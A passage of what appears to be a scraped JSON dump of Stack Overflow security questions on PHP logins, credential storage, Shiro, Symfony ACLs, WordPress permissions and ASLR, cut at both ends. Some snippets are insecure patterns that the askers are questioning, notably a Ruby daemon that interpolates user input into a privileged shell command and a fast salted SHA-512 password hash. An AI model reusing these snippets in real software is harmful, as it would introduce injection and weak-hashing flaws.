$this-&gt;memDB-&gt;prepare(\"SELECT COUNT(*) FROM accounts WHERE username = ?\");\n        $checkUsername-&gt;execute(array($username));\n        return $checkUsername-&gt;fetchColumn();\n    }\n    //Obtain and set account details\n    private function accountDetails() {\n\n        $fetchAccountDetails = $this-&gt;memDB-&gt;prepare(\"SELECT id, name_f, name_l, ipAddr, lastLogin, accountLevel, isActive \n        FROM accounts WHERE username = ?\");\n        $fetchAccountDetails-&gt;execute(array($this-&gt;username));\n        $accountDetails = $fetchAccountDetails-&gt;fetch();\n        $this-&gt;updateLogin();\n        return $accountDetails;\n    }\n    //Update last login details\n    private function updateLogin() {\n\n        $updateLogin = $this-&gt;memDB-&gt;prepare(\"UPDATE accounts SET ipAddr = ?, lastLogin = DATE_ADD(NOW(), INTERVAL 1 HOUR) WHERE username = ?\");\n        $updateLogin-&gt;execute(array($this-&gt;ip_address, $this-&gt;username));\n    }\n    public function authUser() {\n\n        $loginErr = array(); //Array for holding login error message\n        $loginErrFlag = false; //Boolean for error\n        //Validate submitted $_POST elements\n        if (!$this-&gt;username) {\n            $loginErr[] = \"Username missing\";\n            $loginErrFlag = true;\n        }\n        if (!$this-&gt;password) {\n            $loginErr[] = \"Password missing\";\n            $loginErrFlag = true;\n        }\n        if ($this-&gt;username &amp;&amp; $this-&gt;validateUsername($this-&gt;username) == 0) {\n            $loginErr[] = \"Username invalid\";\n            $loginErrFlag = true;\n        }\n        if (!$loginErrFlag) {\n            //Fetch the password and SALT to compare to entered password\n            $validatePW = $this-&gt;memDB-&gt;prepare(\"SELECT password, salt FROM accounts WHERE username = ? LIMIT 1\");\n            $validatePW-&gt;execute(array($this-&gt;username));\n            $passwordResult = $validatePW-&gt;fetch();\n            $dbPW = $passwordResult['password'];\n            $dbSalt = $passwordResult['salt'];\n            //Compare entered password to SALT + hash\n            $hashPW = hash('sha512', $dbSalt . $this-&gt;password);\n            if ($hashPW === $dbPW) {\n                //Logged in\n                $_SESSION['CVFD-USER-DETAILS'] = $this-&gt;accountDetails();\n                //Redirect to secure landing page for log-in origin (Members or Admin)\n                //Adding SID is a recent attempt to handle log-in problems\n                header(\"Location: http://example.com/$this-&gt;site/$this-&gt;site-main.php?\" . SID);\n                //session_write_close() was here but was removed\n                exit();\n            } else {\n                //Password invalid\n                $loginErr[] = \"Please check your password and try again\";\n                $_SESSION['CVFD_LOGIN_ERR'] = $loginErr;\n                //Redirect to the log-in for the origin\n                header(\"Location: http://example.com/$this-&gt;site\");\n        session_write_close();\n                exit();\n            }\n        } else {\n            $_SESSION['CVFD_LOGIN_ERR'] = $loginErr;\n            header(\"Location: http://example.com/$this-&gt;site\");\n            session_write_close();\n            exit();\n        }\n\n    }\n}\n?&gt;\n</code></pre>\n\n<p><strong>auth.php</strong></p>\n\n<pre><code>&lt;?php\nsession_start();\nif (!isset($_SESSION['CVFD-USER-DETAILS']) || $_SESSION['CVFD-USER-DETAILS'] == '') {\n    //Not logged in\n    $_SESSION['CVFD_LOGIN_ERR'] = array('Please login');\n    header('Location: http://example.com/members');\n    session_write_close();\n    exit();\n} else {\n    $userDetails = $_SESSION['CVFD-USER-DETAILS']; //Assign user details array to variable\n    //Check to see if account is active\n    $accountStatus = $userDetails['isActive'];\n    $accountLevel = $userDetails['accountLevel'];\n    if ($accountStatus == 0) {\n        //Account is not yet active (pending Admin activation)\n        $_SESSION['CVFD_LOGIN_ERR'] = array('Your account is suspended or pending activation');\n        header('Location: http://example.com/members');\n        session_write_close();\n        exit();\n    } else {\n        $CVFDFirstName = $userDetails['name_f'];\n        $CVFDLastName = $userDetails['name_l'];\n        $CVFDLastLogin = date(\"m/d/Y H:i:s\", strtotime($userDetails['lastLogin']));\n        $CVFDAccountLevel = $userDetails['accountLevel'];\n        $CVFDIPAddr = $userDetails['ipAddr'];\n    }\n}\n?&gt;\n</code></pre>\n\n<p>Here is how the auth.php is included in secure files-</p>\n\n<pre><code>&lt;?php\nif (substr_count($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')) ob_start(\"ob_gzhandler\"); else ob_start();\nrequire($_SERVER['DOCUMENT_ROOT'] . '/members/includes/handlers/handler.auth.php');\n</code></pre>\n\n<p>Any help would be appreciated. Quite a mystery..</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","database","security","webserver","credentials"],"answer_count":2,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":68,"score":8,"question_id":12841087,"title":"Securing database connection information","body":"<p>I know that the question <code>How do I secure my database connection credentials?</code> has been asked and answered multiple times (e.g. <a href=\"http://stackoverflow.com/q/97984/259457\">How to secure database passwords in PHP?</a>).</p>\n\n<p>A commonly accepted answer to that question is to store the details outside of the web root. But I'm curious as to why this really makes much difference.</p>\n\n<p>From what I understand, a person cannot download the source of the PHP file via HTTP (unless your web sever is not configured properly, but you would know about that right away). So you won't be able to see the credentials unless you have access to the source of the PHP file anyways. Correct me if I'm wrong, but doesn't this basically mean that you would need shell access? And if you have shell access, can't you just get to the file outside the web root anyways?</p>\n\n<p>If the answer to that question is that the include file might have special permissions that don't allow anyone but the web server user to read it, then (considering that I have shell access), couldn't I just write (or modify) any PHP file to just echo out those credentials?</p>\n\n<p>So the question is, does it <em>really</em> make any difference whether you store the credentials directly in the PHP script vs. in a file outside the web root?</p>\n"},{"tags":["php","security","apache2","sql-injection","vbulletin"],"answer_count":1,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":75,"score":4,"question_id":12839626,"title":"HTTP-SOVIET and HTTP-PACK?","body":"<p>I found a couple vBulletin sites I administer getting hacked recently. They use the latest version of the 3.8 series (3.8.7 Patch Level 2). I am usually pretty good at finding the holes where they get in and patching them up, but this one is stumping me.  They are injecting data into the MySQL tables. The attack always happens when they make a GET request to the <code>faq.php</code> script. I was able to save data when the attack occurs.  This was the <code>$_REQUEST</code>, <code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>, and <code>$_SERVER</code> arrays.  The only thing I saw that looked out of place is that there were two new <code>$_SERVER</code> keys, <code>HTTP_SOVIET</code> and <code>HTTP_PACK</code>:</p>\n\n<p><a href=\"http://pastebin.com/b6WdZtfK\" rel=\"nofollow\">http://pastebin.com/b6WdZtfK</a></p>\n\n<p>I have to assume this is the root of the issue, but I cannot for the life of me figure out how the attacker can set this variable.  There is nothing in the request string, nothing in the cookie array, it is a GET request, not POST.</p>\n\n<p>Any idea?</p>\n"},{"tags":["security","coldfusion","sql-injection"],"answer_count":10,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":564,"score":10,"question_id":2472211,"title":"ColdFusion Security","body":"<p>What are the best practices for securing a coldfusion webpage from malicious users? (including, but not limited to, sql injection attacks)</p>\n\n<p>Is cfqueryparam enough?</p>\n"},{"tags":["c#","security","sql-server-2008","encryption","communication"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":373,"score":2,"question_id":2915036,"title":"How to secure the communication between a SQL Server database and a c# administrative tool?","body":"<p>How can I secure the communication between a C# program running locally on my computer and a SQL Server in a hosted environment?</p>\n\n<p>I have an asp.net application that is secured by SSL encryption. So using the asp.net from an open wlan connection is no problem.</p>\n\n<p>How can I achieve the same kind of encryption for my administrative tool? Would it be best to write a service? But how would that connection to the service be secured?</p>\n"},{"tags":["security","spring","authentication","spring-security","remember-me"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5222,"score":4,"question_id":2608372,"title":"Spring Security RememberMe Services with Session Cookie","body":"<p>I am using Spring Security's RememberMe Services to keep a user authenticated. </p>\n\n<p>I would like to find a simple way to have the RememberMe cookie set as a session cookie rather than with a fixed expiration time. For my application, the cookie should persist until the user closes the browser.</p>\n\n<p>Any suggestions on how to best implement this? Any concerns on this being a potential security problem?</p>\n\n<p>The primary reason for doing so is that with a cookie-based token, any of the servers behind our load balancer can service a protected request without relying on the user's Authentication to be stored in an HttpSession. In fact, I have explicitly told Spring Security to never create sessions using the namespace. Further, we are using Amazon's Elastic Load Balancing, and so sticky sessions are not supported.</p>\n\n<p><em>NB: Although I am aware that as of Apr. 08, Amazon now supports sticky sessions, I still do not want to use them for a handful of other reasons. Namely that the untimely demise of one server would still cause the loss of sessions for all users associated with it.\n<a href=\"http://aws.amazon.com/about-aws/whats-new/2010/04/08/support-for-session-stickiness-in-elastic-load-balancing/\" rel=\"nofollow\">http://aws.amazon.com/about-aws/whats-new/2010/04/08/support-for-session-stickiness-in-elastic-load-balancing/</a></em></p>\n"},{"tags":["ios","security","audio","iphone-sdk-5.0"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1028,"score":1,"question_id":8207520,"title":"Unknown Audio Driver Error","body":"<p>I'm getting strange error message in Console, but application functions properly. Has anyone else seen this error. What does it mean?</p>\n\n<blockquote>\n  <p>2011-11-21 09:52:39.306 MyApplicationName[9871:1f07] Error loading\n  /System/Library/Extensions/AudioIPCDriver.kext/Contents/Resources/AudioIPCPlugIn.bundle/Contents/MacOS/AudioIPCPlugIn:\n  dlopen(/System/Library/Extensions/AudioIPCDriver.kext/Contents/Resources/AudioIPCPlugIn.bundle/Contents/MacOS/AudioIPCPlugIn,\n  262): Symbol not found: _CFXMLNodeGetInfoPtr   Referenced from:\n  /System/Library/Frameworks/Security.framework/Versions/A/Security<br>\n  Expected in:\n  /Developer42/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator5.0.sdk/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\n  in /System/Library/Frameworks/Security.framework/Versions/A/Security</p>\n</blockquote>\n\n<p>(Repeat 8)</p>\n"},{"tags":["java","security","kerberos","ntlm","ntlmv2"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":12837765,"title":"Authentication and SSO Application","body":"<p>My team is developing a Common Authentication-SSO (CASSO) application  to be used within a corporates LAN. Any Web application under the company's domain needs to authenticate the user through this CASSO before the User can access the application. Currently the older version has implemented BASIC/DIGEST and NTLM. However to improve the security concerns we are considering to have KERBEROS within the CASSO. </p>\n\n<p>What Authentication and Security models/protocols  shall be followed? \nSecondly shall Kerberos be implemented along with NTLM, BASIC and DIGEST or is it fine to have only Kerberos and NTLM?</p>\n"},{"tags":["html5","security","canvas","cross-domain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12769566,"title":"HTML5 Canvas cross-domain security issue","body":"<p>What specifically are the security issues that arise by allowing cross-domain image data to be manipulated?</p>\n\n<p>I know that if you own both domains, you can allow it. I'm wondering why it would be ill-advised to load in Facebook / Instagram images into a canvas to manipulate.</p>\n"},{"tags":["php","html","security","filtering"],"answer_count":7,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":392,"score":10,"question_id":2319956,"title":"Are there any good PHP based HTML filters available?","body":"<p>I am currently in a project with a PHP frontend. We're pretty concerned about security, because we'll have quite a lot of users and are an attractive target for hackers. Our users are able to submit HTML formatted content that is visible to other users later. This is a big problem because we're vulnerable for the whole set of XSS attacks. We're filtering as good as we can, but the variety of attack vectors is pretty big.</p>\n\n<p>So, I'm searching for PHP based HTML sanitizing/filtering solutions. Commercial solutions are fine (even preferred). Currently we're using a modified HTML purifier, but we're not satisfied with the results. </p>\n\n<p>What are some good libraries/tools that are capable of filtering malicious parts of HTML?</p>\n\n<p>It is nice to have for example HTML5 awareness, which will become a security nightmare once it's available \"in the wild\".</p>\n\n<p><strong>Update:</strong>\nWe're doing an in-depth configuration of <a href=\"http://htmlpurifier.org/\" rel=\"nofollow\">HTML Purifier</a>. It looks like the older framework we used before was just not configuring it at all. Now the results look much better.</p>\n"},{"tags":["security","automation","rsa"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12072628,"title":"Is it possible to access RSA Secure Id programmatically for use in Test Automation?","body":"<p>I have a requirement where I need to enter secure Id from RSA token during login authentication and then start running automation test. </p>\n\n<p>Is it possible to access the RSA token value programmatically through any api or any other way , so that test flow can be automated completely?</p>\n"},{"tags":["security","symfony2","login","fosuserbundle"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":243,"score":3,"question_id":12672169,"title":"How to restfully login, Symfony2 Security, FOSUserBundle, FOSRestBundle?","body":"<p>I'd like to be able to login via a ws.</p>\n\n<p>I've tried to simulate this with curl pointing to <code>/login</code> but it only handles HTML, etc.\nBy the way, it requires a CSRF which I don't want.</p>\n\n<p>So I'd like to either disable the CRSF (from the <code>login_check</code>) or find a way to do it myself.</p>\n\n<p>Can I override the LoginListener (where is it?) which is used when the route <code>login_check</code> is catched.</p>\n\n<p>ANy clues?</p>\n"},{"tags":["php","security","symfony2","acl","privileges"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":12815766,"title":"Symfony 2 ACL User priviliges","body":"<p><strong>Short description:</strong></p>\n\n<p>If I add user as owner of a entity the ACL says he has no rights.</p>\n\n<p><strong>Long descroption:</strong></p>\n\n<p>If I create a blogComment I add the user as MASK_CREATOR</p>\n\n<pre><code>public function createModel( $blogComment )\n{\n    parent::createModel( $blogComment );\n\n    // Creating the ACL\n    $aclProvider = $this-&gt;get('security.acl.provider');\n    $objectIdentity = ObjectIdentity::fromDomainObject($blogComment);\n    $acl = $aclProvider-&gt;createAcl($objectIdentity);\n\n    // retrieving the security identity of the currently logged-in user\n    $securityContext  = $this-&gt;get('security.context');\n    $user             = $securityContext-&gt;getToken()-&gt;getUser();\n    $securityIdentity = UserSecurityIdentity::fromAccount($user);\n    $acl-&gt;insertObjectAce($securityIdentity, MaskBuilder::MASK_OWNER);\n\n    // grant access\n    $aclProvider-&gt;updateAcl($acl);\n}\n</code></pre>\n\n<p>Data from the database:</p>\n\n<ul>\n<li>Class: MV\\NameBundle\\Entity\\BlogComment</li>\n<li>Identity MV\\NameBundle\\Entity\\User-Pietje</li>\n<li>ObjectId: 11</li>\n<li>FieldName:</li>\n<li>Ace Order: 0</li>\n<li>Mask: 128</li>\n<li>Granting: 1</li>\n<li>Granging Strategy: all</li>\n</ul>\n\n<p>now if I check if the user can edit it (should be with mask 128 (MASK_OWNER)).</p>\n\n<pre><code>if (false === $securityContext-&gt;isGranted('EDIT', $entity)){\n     var_dump('can not edit blogComment ' . $entity-&gt;getId() );\n} else {\n     var_dump('can edit blogComment ' . $entity-&gt;getId() );\n}\n</code></pre>\n\n<p>He's saying he can not, so I guess there is something wrong.</p>\n\n<p>Now I was debugging and dont know what to do next:</p>\n\n<ul>\n<li>Class:     Symfony/Component/Security/Acl/Domain/PermissionGrantingStrategy.php</li>\n<li>function :hasSufficientPermissions</li>\n</ul>\n\n<p>I was looking to the:</p>\n\n<pre><code>143: if ($sid-&gt;equals($ace-&gt;getSecurityIdentity()) &amp;&amp; $this-&gt;isAceApplicable($requiredMask, $ace)) {\n</code></pre>\n\n<p>This is where he should end in the if, but he won't because the $sid->equeals only the the role identitys and not the user one.\ndump of the equals:</p>\n\n<pre><code>object(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[316]\n  private 'role' =&gt; string 'IS_AUTHENTICATED_ANONYMOUSLY' (length=28)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n\nobject(Symfony\\Component\\Security\\Acl\\Domain\\RoleSecurityIdentity)[364]\n  private 'role' =&gt; string 'ROLE_ADMIN' (length=10)\n</code></pre>\n\n<p>I don't see any users in this list, What wrong should he not check the users also?\nLet me know if you can help me out.</p>\n\n<p>Regards Mitchel</p>\n"},{"tags":["iphone","objective-c","security","openssl","rsa"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":12833223,"title":"Can Anyone help out with Including openssl into my project","body":"<p>I am trying to include the</p>\n\n<p><a href=\"http://www.openssl.org/source/\" rel=\"nofollow\">4457113 May 10 17:20:24 2012 openssl-1.0.1c.tar.gz </a> but I am constantly getting this <strong>Error</strong></p>\n\n<p><strong>unable to expand Openssl 1.0.1c.tar.gz into RegisterationMsg\n   Error1 =operation not permitted</strong></p>\n"},{"tags":["c#","security","permissions","iprincipal"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":942,"score":3,"question_id":4128186,"title":"Code is ignoring PrincipalPermission attribute?","body":"<p>I have a Delete method on all my business objects that has the PrincipalPermission attribute on it.</p>\n\n<p>Example:</p>\n\n<pre><code>[PrincipalPermission(SecurityAction.Demand, Role = \"Vendor Manager\")]\n        public static bool Delete(Vendor myVendor)\n        {\n\n            //do work here\n        }\n</code></pre>\n\n<p>The problem is that it appears to be completely ignoring my PrincipalPermission.  It lets anyone through, no matter what role they may be part of.</p>\n\n<p>Is there something else I've forgotten to do? I have added the following to my Application's global.asax in the Application Startup section:</p>\n\n<pre><code>AppDomain.CurrentDomain.SetPrincipalPolicy(System.Security.Principal.PrincipalPolicy.WindowsPrincipal);\n</code></pre>\n\n<p>But that doesn't make any difference either.</p>\n\n<p>I also just tried the following:</p>\n\n<pre><code>public static bool Delete(Vendor myVendor)\n        {\n            PrincipalPermission iPerm = new PrincipalPermission(null, \"Vendor Manager\");\n            iPerm.Demand();\n\n            //do work here\n        }\n</code></pre>\n\n<p>and wouldn't ya know, this works just fine!....  any ideas on why it works one way but not the other?</p>\n"},{"tags":["android","security","locking"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":66,"score":4,"question_id":12830605,"title":"Prevent device lock in android while my activity is running AND device is connected to charger","body":"<p>I've got a night clock app and I want to disable the keyguard for the device while the app is running AND the device is on a charger. The idea is that if you are on a charger and this app is running then it's reasonable to assume that you are in a safe location. When the app is exited (either via back or home) then I do NOT want the unlock screen to appear, just allow normal usage as if the phone was never idle for more than the device's lock time. </p>\n\n<p>Currently my app uses the FLAG_SHOW_WHEN_LOCKED window option and it nicely keeps the screen on and unlocked, but when I hit back or home (after the lock time has expired) I get the unlock keypad screen to unlock the device. I want to prevent this locking of other apps from happening while my app is running and the device is on the charger. I will obviously make this functionality a setting that the user chooses, but how to implement this?</p>\n\n<p>Can anyone help me with this - all my googleing efforts point to keeping only my app from locking, but I've already got that solved.</p>\n\n<p>Thanks.</p>\n"},{"tags":["security","jsf-2","java-ee-6","shiro"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12775343,"title":"Can a JSF Page level permission be set using Shiro","body":"<p>I'm just wondering if we have a page level permission settings in Shiro? For example I have a jsf page that I only want to show in user with role staff and permission delete.</p>\n\n<p>In JBoss we have something like:</p>\n\n<pre><code>&lt;page xmlns=\"http://jboss.com/products/seam/pages\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://jboss.com/products/seam/pages http://jboss.com/products/seam/pages-2.1.xsd\"&gt;\n    &lt;restrict&gt;#{persistentPermissionResolver.hasPermission('staff','delete')}&lt;/restrict&gt;\n&lt;/page&gt;\n</code></pre>\n\n<p>Is this functionality also available in JavaEE6 + Shiro + JSF? It seems the JSP and JSF plugin only supports enabling a certain portion of a webpage being accessible to a certain role with a certain permission.</p>\n\n<p>Thanks,\n<br />czetsuya</p>\n"},{"tags":["security","jsf-2","java-ee-6","shiro"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12810999,"title":"Shiro annotation not working on JavaEE6 project","body":"<p>Question: Where is the implementation for JavaEE6?</p>\n\n<p>I'm currently working on a JavaEE6 project and I found out that Shiro's annotation is not working out of the box even though I already configured web.xml and shiro.ini base on the documentation.</p>\n\n<p>This is what I have:</p>\n\n<p>1.) A page:</p>\n\n<pre><code>&lt;h:form&gt;\n  &lt;h:commandLink action=\"#{userBean.action1()}\" value=\"Action 1\"&gt;&lt;/h:commandLink&gt;\n&lt;/h:form&gt;\n</code></pre>\n\n<p>2.) Backing bean:</p>\n\n<pre><code>@Stateless\n@Named\npublic class UserBean {\n    @Inject\n    private Logger log;\n\n    @RequiresAuthentication\n    public void action1() {\n        log.debug(\"action.1\");\n    }\n}\n</code></pre>\n\n<p>3.) web.xml</p>\n\n<pre><code>&lt;listener&gt;\n    &lt;listener-class&gt;org.apache.shiro.web.env.EnvironmentLoaderListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n\n&lt;filter&gt;\n    &lt;filter-name&gt;ShiroFilter&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.apache.shiro.web.servlet.ShiroFilter&lt;/filter-class&gt;\n&lt;/filter&gt;\n\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;ShiroFilter&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n</code></pre>\n\n<p>4.) shiro.ini</p>\n\n<pre><code>[main]\n# listener = org.apache.shiro.config.event.LoggingBeanListener\n\nshiro.loginUrl = /login.xhtml\n\n[users]\n# format: username = password, role1, role2, ..., roleN\nroot = secret,admin\nguest = guest,guest\npresidentskroob = 12345,president\ndarkhelmet = ludicrousspeed,darklord,schwartz\nlonestarr = vespa,goodguy,schwartz\n\n[roles]\n# format: roleName = permission1, permission2, ..., permissionN\nadmin = *\nschwartz = lightsaber:*\ngoodguy = winnebago:drive:eagle5\n\n[urls]\n# The /login.jsp is not restricted to authenticated users (otherwise no one could log in!), but\n# the 'authc' filter must still be specified for it so it can process that url's\n# login submissions. It is 'smart' enough to allow those requests through as specified by the\n# shiro.loginUrl above.\n/login.xhtml = authc\n/logout = logout\n/account/** = authc\n/remoting/** = authc, roles[b2bClient], perms[\"remote:invoke:lan,wan\"]\n</code></pre>\n\n<p>But when I click the button, it still performs the action. It should throw unauthorizede exception right? The same is true with other shiro annotations.</p>\n\n<p>Note that if I manually performs the check, it works:</p>\n\n<pre><code>public void action1() {\n    Subject currentUser = SecurityUtils.getSubject();\n    AuthenticationToken token = new UsernamePasswordToken(\"guest\", \"guest\");\n    currentUser.login(token);\n\n    log.debug(\"user.\" + currentUser);\n    if (currentUser.isAuthenticated()) {\n        log.debug(\"action.1\");\n    } else {\n        log.debug(\"not authenticated\");\n    }\n}\n</code></pre>\n\n<p>Thanks,\n<br />czetsuya</p>\n"},{"tags":["java","security","email","sslhandshakeexception"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12832354,"title":"SSLHandshakeException in Mail Sending Code","body":"<p>I am developing code for sending email from my domain to gmail.com</p>\n\n<p>I get a <code>SSLHandshakeException</code> (see below).<br>\nHow to Solve this??</p>\n\n<pre><code>Exception in thread \"main\" javax.mail.MessagingException: Could not convert socket to TLS;\n  nested exception is:\njavax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: \n    PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: \n    unable to find valid certification path to requested target\n</code></pre>\n"},{"tags":["php","security","hash","password-protection"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":121,"score":3,"question_id":11965708,"title":"PHP - hash_pbkdf2 function","body":"<p>I'm trying to do a function to hash passwords with this php function: <a href=\"http://be.php.net/manual/en/function.hash-pbkdf2.php\" rel=\"nofollow\">http://be.php.net/manual/en/function.hash-pbkdf2.php</a>.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>$hash_algo = \"sha256\";\n$password = \"password\";\n$salt = \"salt\";\n$iterations = 1;\n$length = 1;\n$raw_output = false;\n\n$hash = hash_pbkdf2($hash_algo, $password, $salt, $iterations ,$length ,$raw_output);\n\necho $hash;\n</code></pre>\n\n<p>I got this error: <strong>Fatal error: Call to undefined function hash_pbkdf2().</strong></p>\n\n<p>How can the function be undefined???</p>\n\n<p>PS: All the values of my variables are set just for testing the function. Obviously the salt will not be \"salt\", etc.</p>\n"},{"tags":["security","dotnetnuke"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":2222,"score":6,"question_id":138175,"title":"DotNetNuke vulnerabilities","body":"<p>Anyone familiar with specific security issues in the current version of DotNetNuke?<br />\n(I've already checked out their site, securityfocus, etc...)</p>\n\n<p>I've reopened the question, since my client developed their system using DotNetNuke - hence it is a programming question. I just need to know some issues regarding this platform.</p>\n"},{"tags":["ios","osx","security","osx-lion","ios6"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":64,"score":3,"question_id":12824045,"title":"What exactly is randomized with ASLR in MacOS X and iOS","body":"<p>Does anybody have a link to a documentation what exactly is randomized in what cases for latest Mac OS (10.7) and iOS (6.0)?</p>\n\n<p>I mean. I want to see a list (something like)</p>\n\n<ul>\n<li><p>Code segment (in a case A,B,C)</p></li>\n<li><p>Stack (always)</p></li>\n<li><p>Heap</p></li>\n<li><p>Data segment (never)</p></li>\n</ul>\n\n<p>Preferably with how many bits of randomization each thing has.</p>\n\n<p>All I can find is something like: \"MacOS Lion implements full ASLR\" and in other places \"full ASLR is implemented different ways for different operation systems\", which is obviously not very informative.</p>\n"},{"tags":["java","string","security","passwords","char"],"answer_count":9,"favorite_count":123,"up_vote_count":478,"down_vote_count":1,"view_count":34171,"score":477,"question_id":8881291,"title":"Why is char[] preferred over String for passwords?","body":"<p>In <a href=\"http://en.wikipedia.org/wiki/Swing_%28Java%29\">Swing</a>, the password field has a <code>getPassword()</code> (returns <code>char[]</code>) method instead of the usual <code>getText()</code> (returns <code>String</code>) method. Similarly, I have come across a suggestion not to use <code>String</code>s to handle passwords. Why does <code>String</code> pose a threat to security when it comes to passwords?</p>\n\n<p>It feels inconvenient to use <code>char[]</code>.</p>\n"},{"tags":["wordpress","security","ubuntu","permissions"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12827513,"title":"What permissions should a wordpress installation have to be secure but functional?","body":"<p>I've already read <a href=\"http://codex.wordpress.org/Hardening_WordPress\" rel=\"nofollow\">http://codex.wordpress.org/Hardening_WordPress</a> but I can't get my head around it. What are the permissions that shall be set and by who shall it be owned by? Right now I have set as the result of the following commands:</p>\n\n<pre><code># reset to safe defaults\nfind /usr/share/wordpress -exec chown www-data:www-data {} \\;\nfind /usr/share/wordpress -type d -exec chmod 755 {} \\;\nfind /usr/share/wordpress -type f -exec chmod 644 {} \\;\n\n# allow wordpress to manage wp-config.php (but prevent world access)\nchgrp www-data /usr/share/wordpress/wp-config.php\nchmod 660 /usr/share/wordpress/wp-config.php\n\n# allow wordpress to manage .htaccess\nchgrp www-data /usr/share/wordpress/.htaccess\nchmod 664 /usr/share/wordpress/.htaccess\n\n# allow wordpress to manage wp-content\nfind /usr/share/wordpress/wp-content -exec chgrp www-data {} \\;\nfind /usr/share/wordpress/wp-content -type d -exec chmod 775 {} \\;\nfind /usr/share/wordpress/wp-content -type f -exec chmod 664 {} \\;\n</code></pre>\n\n<p>After this configuration the installation is unusable. Any tips?</p>\n"},{"tags":["ruby","security","shell","system","sanitization"],"answer_count":3,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":1457,"score":7,"question_id":4650636,"title":"Forming sanitary shell commands or system calls in Ruby","body":"<p>I'm building a daemon that will help me manage my server(s). Webmin works fine, as does just opening a shell to the server, but I'd prefer to be able to control server operations from a UI I design, and also expose some functionality to end users.</p>\n\n<p>The daemon will pick up actions from a queue and execute them. However, since I'll be accepting input from users, I want to make sure they're not permitted to inject something dangerous into a privileged shell command.</p>\n\n<p>Here's a fragment that exemplifies my problem:</p>\n\n<pre><code>def perform\n  system \"usermod -p #{@options['shadow']} #{@options['username']}\"\nend\n</code></pre>\n\n<p>A gist that explains more: <a href=\"https://gist.github.com/773292\" rel=\"nofollow\">https://gist.github.com/773292</a></p>\n\n<p>I'm not positive if typical escaping and sanitizing of inputs is enough for this case, and being a designer, I don't have a ton of security-related experience. <strong>I know that this is something that should probably be obvious to me</strong>, but its not!</p>\n\n<p>How can I ensure that the web application that will create and serialize the actions can't pass dangerous text into the privileged process that receives the actions?</p>\n\n<p>Thanks for the help<br>\narb</p>\n"},{"tags":["iphone","ios","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":219,"score":1,"question_id":9141583,"title":"How to detect that PIE/ASLR has been enabled for my iOS app?","body":"<p>I am enabling PIE (position-independent executable)/ASLR (address space layout randomization) for an iPhone app by using the <code>\"-w -pie\"</code> linking option flag. Is there any way I can ensure that things are now set to work as advertised? I tried printing the address of a variable <em>(Edit: and a function)</em> with NSLog and it comes up the same each time. Am I doing it right?</p>\n"},{"tags":["sql","security","web-applications"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12827129,"title":"Protection against timing attack on 